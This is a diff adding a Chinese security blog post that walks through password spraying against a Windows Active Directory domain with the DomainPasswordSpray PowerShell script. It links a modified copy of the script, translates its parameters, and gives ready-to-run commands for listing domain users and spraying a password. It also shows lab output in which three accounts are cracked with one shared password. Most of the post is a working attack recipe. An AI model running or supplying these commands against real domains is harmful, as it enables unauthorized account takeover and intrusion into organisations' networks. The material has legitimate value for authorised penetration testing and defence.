@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Windows域渗透 - 用户密码枚举 « 倾旋的博客</title>
+  <meta name="description" content="推荐一个Powershell脚本">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/archivers/2018-05-02/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml" />
+  <link href="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/css/lightbox.min.css" rel="stylesheet">
+</head>
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">关于</a>
+      
+        
+        <a class="page-link" href="/category/">分类</a>
+      
+        
+        <a class="page-link" href="/posts/">所有文章</a>
+      
+        
+        <a class="page-link" href="/tools/">Web工具箱</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+            <header class="post-header">
+              <h1 class="post-title">Windows域渗透 - 用户密码枚举</h1>
+              <p class="post-meta">2018-05-02</p>
+            </header>
+            <article class="post-content">
+              <p>推荐一个Powershell脚本
+<!--more--></p>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+
+<p>在进行Windows域渗透的时候，面对庞大的用户账号，不知该从何下手，扫描网络服务有怕搞出大动静，肿么办呢？</p>
+
+<h2 id="0x01-powershell">0x01 Powershell</h2>
+
+<p>目前已经有很多Powershell集合脚本，用于域渗透简直舒爽</p>
+
+<p>今天推荐一款名字叫<code class="highlighter-rouge">DomainPasswordSpray.ps1</code>的脚本，主要原理是先来抓取域用户账号，然后指定密码字典进行域认证。认证通过的就是密码正确的了。</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x00.png" alt="0x00" /></p>
+
+<p><strong>GitHub项目地址：https://github.com/dafthack/DomainPasswordSpray</strong></p>
+
+<p>由于作者的脚本有一个小瑕疵，故此我改了一下，避免抛出了一些错误。</p>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x01.png" alt="0x01" /></p>
+
+<p><strong>优化后的地址：http://payloads.online/scripts/Invoke-DomainPasswordSpray.txt</strong></p>
+
+<h2 id="0x02-参数说明">0x02 参数说明</h2>
+
+<p>在代码的开头就已经有介绍了，我简单汉化一下。</p>
+
+<p>描述：该模块主要用于从域中收集用户列表。</p>
+
+<ul>
+  <li>参数： <code class="highlighter-rouge">Domain</code> 指定要测试的域名</li>
+  <li>参数： <code class="highlighter-rouge">RemoveDisabled</code> 尝试从用户列表删除禁用的账户</li>
+  <li>参数： <code class="highlighter-rouge">RemovePotentialLockouts</code> 删除锁定账户</li>
+  <li>参数： <code class="highlighter-rouge">UserList</code> 自定义用户列表(字典)。 如果未指定，这将自动从域中获取</li>
+  <li>参数： <code class="highlighter-rouge">Password</code> 指定单个密码进行口令测试</li>
+  <li>参数： <code class="highlighter-rouge">PasswordList</code> 指定一个密码字典</li>
+  <li>参数： <code class="highlighter-rouge">OutFile</code> 将结果保存到某个文件</li>
+  <li>参数： <code class="highlighter-rouge">Force</code> 当枚举出第一个后继续枚举，不询问</li>
+</ul>
+
+<h2 id="0x03-使用说明">0x03 使用说明</h2>
+
+<p>使用例子：</p>
+
+<p><code class="highlighter-rouge">C:\PS&gt; Get-DomainUserList</code></p>
+
+<p>该命令将从域中收集用户列表。</p>
+
+<p><code class="highlighter-rouge">C:\PS&gt; Get-DomainUserList -Domain 域名 -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</code></p>
+
+<p>该命令将收集域“域名”中的用户列表，包括任何未被禁用且未接近锁定状态的帐户。 它会将结果写入“userlist.txt”文件中</p>
+
+<p><code class="highlighter-rouge">C:\PS&gt; Invoke-DomainPasswordSpray -Password Winter2016</code></p>
+
+<p>该命令将会从域环境中获取用户名，然后逐个以密码<code class="highlighter-rouge">Winter2016</code>进行认证枚举</p>
+
+<p><code class="highlighter-rouge">C:\PS&gt; Invoke-DomainPasswordSpray -UserList users.txt -Domain 域名 -PasswordList passlist.txt -OutFile sprayed-creds.txt</code></p>
+
+<p>该命令将会从<code class="highlighter-rouge">users.txt</code>中提取用户名，与<code class="highlighter-rouge">passlist.txt</code>中的密码对照成一对口令，进行域认证枚举，登录成功的结果将会输出到<code class="highlighter-rouge">sprayed-creds.txt</code></p>
+
+<h2 id="0x04-实战">0x04 实战</h2>
+
+<h3 id="获取域环境中的用户列表">获取域环境中的用户列表</h3>
+
+<p><strong>命令：</strong><code class="highlighter-rouge">C:\PS&gt; Get-DomainUserList | Out-File -Encoding ascii userlist.txt</code></p>
+
+<p><strong>输出：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] There are 8 total users found.
+[*] Created a userlist containing 8 users gathered from the current user's domain
+</code></pre></div></div>
+
+<p>获取的用户名：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\PS&gt; type .\userlist.txt
+Administrator
+Guest
+liyingzhe
+krbtgt
+Hack
+testPass
+webManager
+dba
+</code></pre></div></div>
+
+<h3 id="密码枚举">密码枚举</h3>
+
+<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-05-02/0x02.png" alt="0x02" /></p>
+
+<p><strong>命令：</strong> <code class="highlighter-rouge">C:\PS&gt; Invoke-DomainPasswordSpray -Domain 域名 -Password w!23456 -OutFile sprayed-creds.txt</code></p>
+
+<p><strong>输出：</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Current domain is compatible with Fine-Grained Password Policy.
+[*] Now creating a list of users to spray...
+[*] There appears to be no lockout policy.
+[*] Removing disabled users from list.
+[*] There are 6 total users found.
+[*] Removing users within 1 attempt of locking out from list.
+[*] Created a userlist containing 6 users gathered from the current user's domain
+[*] Password spraying has begun. Current time is 18:45
+[*] This might take a while depending on the total number of users
+1 of 6 users tested2 of 6 users tested3 of 6 users tested[*] SUCCESS! User:testPass Password:w!23456
+4 of 6 users tested[*] SUCCESS! User:webManager Password:w!23456
+5 of 6 users tested[*] SUCCESS! User:dba Password:w!23456
+6 of 6 users tested[*] Password spraying is complete
+[*] Any passwords that were successfully sprayed have been output to sprayed-creds.txt
+</code></pre></div></div>
+
+<p>枚举的结果：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\PS &gt; type .\sprayed-creds.txt
+testPass:w!23456
+webManager:w!23456
+dba:w!23456
+</code></pre></div></div>
+
+
+            </article>
+            
+            <div id="lv-container" data-id="city" data-uid="MTAyMC8zNjE3NC8xMjcwOQ==" style="padding-top:150px">
+  <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+  </script>
+<noscript> &gt;_&lt; </noscript>
+</div>
+          </div>
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/images/head.jpeg" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>安全从业者，爱好安全产品开发，渗透测试，Web漏洞研究</p>
+  <p class="contact">
+    
+    <a href="https://github.com/rvn0xsy">GitHub</a>
+    
+    
+    <a href="javascript:document.write('payloads'+'@'+'aliyun.com');">Email</a>
+    
+  </p>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","qzone","tsina","bdysc","weixin","tqq","douban","sqq","youdao","mail","fbook","twi","linkedin","evernotecn","copy","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"slide":{"type":"slide","bdImg":"8","bdPos":"right","bdTop":"29"}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+    <div class="col-box post-toc hide" style="text-align: left;">
+      <div class="col-box-title" style="text-align: center;">TOC</div>
+    </div>
+
+</div>
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+&copy; 2018 倾旋
+</div>
+</footer>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+<script type="text/javascript" src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/js/lightbox-plus-jquery.min.js"></script>
+<script type="text/javascript" src="/js/global.js"></script>
+</body>
+</html>
+
